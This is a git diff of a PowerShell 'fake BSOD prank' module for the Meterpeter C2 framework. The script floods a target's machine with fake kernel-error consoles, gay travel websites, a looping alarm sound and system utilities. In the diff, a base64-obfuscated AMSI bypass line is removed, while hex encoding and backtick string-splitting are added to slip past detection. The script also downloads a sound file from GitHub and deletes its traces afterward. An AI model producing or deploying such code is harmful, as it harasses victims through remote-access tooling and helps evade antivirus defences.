@@ -1,6 +1,6 @@
 ﻿<#
 .SYNOPSIS
-   Powershell Fake BSOD Prank
+   Powershell Fake B`SO`D Prank
 
    Author: @r00t-3xp10it (ssa redteam)
    Tested Under: Windows 10 (19043) x64 bits
@@ -12,10 +12,9 @@
    Auxiliary module of Meterpeter C2 v2.10.12 that executes a prank in background.
    The prank consists in spawning diferent Gay websites on target default browser,
    spawn cmd terminal consoles pretending to be a kernel error while executing an
-   sfx sound effect. It also spawns windows diskmgmt.msc, firewall.cpl, appwiz.cpl
+   sfx sound effect. It also spawns multiple windows system applications.
 
 .NOTES
-   Invoking -maxinteractions greater than '200' will probably trigger BSOD.
    If not declared -wavefile 'file.wav' then cmdlet downloads the main sfx
    sound effect to be played in background loop. If declared then cmdlet uses
    file.wav as main sfx sound effect. However the Parameter declaration only
@@ -30,8 +29,8 @@
 .Parameter WaveFile
    Accepts the main sfx effect file (default: Critical.wav)
 
-.Parameter PreventBSOD
-   Prevent the prank from BSOD target? (default: true)
+.Parameter PreventB`SO`D
+   Prevent the prank from BS`O`D target? (default: true)
   
 .EXAMPLE
    PS C:\> .\C2Prank.ps1
@@ -53,33 +52,31 @@
    None. You cannot pipe objects into C2Prank.ps1
 
 .OUTPUTS
-   * Powershell Fake BSOD Prank
+   * Powershell Fake B`SOD Prank
      => Download 'Critical error' sfx sound effect
    * maxinteractions: 20 with: 30 (seconds)
    
 .LINK
    https://github.com/r00t-3xp10it/meterpeter
-   https://gist.github.com/r00t-3xp10it/95fc2ba7190c4a362a28b2266dcda0e1?permalink_comment_id=4135669#gistcomment-4135669
 #>
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
-   [string]$WaveFile="Critical.wav", #Main sfx sound effect
-   [string]$PreventBSOD="true",      #Prevent the prank from BSOD?
-   [int]$MaxInteractions='20',       #How many times to loop jump?
-   [int]$DelayTime='20'              #Delay time between loops? (seconds)
+   [string]$WaveFile="Critical.wav",
+   [string]$PreventBSOD="true",
+   [int]$MaxInteractions='20',
+   [int]$DelayTime='20'
 )
 
 
-#Global variable declarations
+## Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
-[int]$FinalSfx = $MaxInteractions -1 #Set the last interaction!
-write-host "* Powershell Fake BSOD Prank" -ForegroundColor Green
+[int]$FinalSfx = $MaxInteractions -1 ## Set the last interaction!
+write-host "* Powershell Fake BS`OD Prank" -ForegroundColor Green
 $LasLink = "https://www.travelgay.pt/destination/gay-portugal/gay-lisbon"
 $UrlLink = "https://www.travelgay.com/destination/gay-portugal/gay-lisbon"
 $UriLink = "https://theculturetrip.com/europe/portugal/lisbon/articles/the-top-10-lgbt-clubs-and-bars-in-lisbon"
 
-[Ref].Assembly.GetType($('System.Management.Automation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)
 
 #Download sound sfx files from my github repository
 If($WaveFile -ieq "Critical.wav" -or $WaveFile -iNotMatch '(.wav)$')
@@ -93,35 +90,25 @@ If($WaveFile -ieq "Critical.wav" -or $WaveFile -iNotMatch '(.wav)$')
       Start-Sleep -Seconds 1
    }
 
-   #Download 'Critical error' windows sound effect
+   ## Download 'Critical error' windows sound effect
    write-host "  => Download 'Critical error' sfx sound effect" -ForegroundColor DarkYellow
-   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/Critical.wav" -outfile "Critical.wav"|Unblock-File
-}
+   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/Critical.wav" -outfile "Critical.wav"|Unblock-File}
 
 
 If($PreventBSOD -ieq "true")
 {
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
-      Helper - Prevent prank from BSOD target host
-
-   .NOTES
-      BSOD allways depends of target system RAM\CPU cicles.
-   #>
-
    If($MaxInteractions -gt 200)
    {
       $DelayTime = "10"
       [int]$MaxInteractions = 100
-      write-host "x" -ForegroundColor Red -NoNewline;
-      write-host " error: current -maxinteractions parameter will cause BSOD .." -ForegroundColor DarkGray
+      write-host "x" -ForegroundColor Red -NoNewline
+      write-host " Error: current -maxinteractions parameter will cause BS`OD .." -ForegroundColor DarkGray
       write-host "  => Defaulting -maxinteractions arg to '$MaxInteractions' interactions .." -ForegroundColor DarkYellow
    }
 }
 
 
-#lOOP Function
+## lOOP Function
 $PlayWav = New-Object System.Media.SoundPlayer
 write-host "* maxinteractions: $MaxInteractions with: $DelayTime (seconds)" -ForegroundColor Green
 For($i=1; $i -lt $MaxInteractions; $i++)
@@ -154,25 +141,31 @@ For($i=1; $i -lt $MaxInteractions; $i++)
    $MsgBoxTitle = "KERNEL WARNNING 00xf340d0.421"
    $MsgBoxText = "Kernel: Critical Error 00xf340d0.421 Memory Corruption!"
    #Spawn cmd terminal console and make it look like one kernel error as ocurr
-   Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"
+   Start-Process cmd.exe -argumentlist "/R color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"
 
    Start-Sleep -Seconds 1
    Start $Env:PROGRAMFILES
 
    If($i -Match '^(3|7|12|13|15|16|18|20|23|27|30|32|33|40|50|60|70|80|90|97|98|99|100)$')
    {
-      #Open drive manager
-      Start-Process diskmgmt.msc
+      $HexProcessName = $null
+      ## Open drive manager [HEX obfuscated]
+      $DeObfuscate = '64 69 73 6B 6D 67 6D 74 2E 6D 73 63'.Split(" ")|ForEach{[char]([convert]::toint16($_,16))}|ForEach{$HexProcessName=$HexProcessName+$_}
+      Start-Process $HexProcessName
    }
    ElseIf($i -Match '^(5|9|14|17|18|19|20|21|25|29|30|40|50|60|70|80|90|97|98|99|100)$')
    {
-      #Open firewall manager
-      Start-Process firewall.cpl
+      $HexProcessName = $null
+      #Open firewall manager [HEX obfuscated]
+      $DeObfuscate = '66 69 72 65 77 61 6C 6C 2E 63 70 6C'.Split(" ")|ForEach{[char]([convert]::toint16($_,16))}|ForEach{$HexProcessName=$HexProcessName+$_}
+      Start-Process $HexProcessName
    }
    ElseIf($i -Match '^(6|8|9|11|13|15|17|19|20|22|23|24|30|40|50|60|70|80|90|97|98|99|100)$')
    {
-      #Open programs manager
-      Start-Process appwiz.cpl
+      $HexProcessName = $null
+      #Open programs manager [HEX obfuscated]
+      $DeObfuscate = '61 70 70 77 69 7A 2E 63 70 6C'.Split(" ")|ForEach{[char]([convert]::toint16($_,16))}|ForEach{$HexProcessName=$HexProcessName+$_}
+      Start-Process $HexProcessName 
    }
    ElseIf($i -Match "^($FinalSfx)$")
    {
@@ -182,7 +175,7 @@ For($i=1; $i -lt $MaxInteractions; $i++)
    }
 
    #Spawn cmd terminal console and make it look like one kernel error as ocurr
-   Start-Process cmd.exe -argumentlist "/c color C0&title $MsgBoxTitle&echo $MsgBoxText&Pause"
+   Start-Process cmd.exe -argumentlist "/R color C0&title $MsgBoxTitle&echo $MsgBoxText&Pause"
 
 }
 
@@ -190,6 +183,7 @@ For($i=1; $i -lt $MaxInteractions; $i++)
 Start-Sleep -Seconds 1
 #Clean artifacts left behind
 Remove-Item -Path "$WaveFile" -Force
+Remove-Item -Path "$pwd\hensandrooster.wav" -Force
 
 #Spawn alert message box at loop completed
 powershell (New-Object -ComObject Wscript.Shell).Popup("$MsgBoxText",0,"$MsgBoxTitle",0+64)|Out-Null
